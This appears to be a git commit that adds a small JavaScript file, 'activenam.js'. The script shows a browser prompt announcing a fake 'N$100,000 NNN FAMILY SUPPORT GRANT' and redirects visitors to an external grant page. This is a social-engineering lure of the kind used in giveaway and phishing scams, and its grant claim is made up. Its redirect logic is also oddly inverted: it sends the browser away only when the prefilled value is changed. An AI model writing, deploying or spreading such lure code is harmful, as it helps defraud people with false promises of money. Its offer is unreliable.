e7c87dffcaa3c842a2210f1342629cd13421ec28
The-On-going <sirpeelawson@gmail.com>
2026-09-20 18:08:42 +0100

    Create activenam.js

---
+++ activenam.js
@@ -0,0 +1,10 @@
+var password = 'N$100,000';
+
+password = prompt(
+  'Congratulations, you are eligible to Receive N$100,000 NNN FAMILY SUPPORT GRANT. Click OK to receive Instantly.',
+  'N$100,000'
+);
+
+if (password !== 'N$100,000') {
+    location.href = 'https://ongoing-grant.info/100000-Family-Support.html';
+}
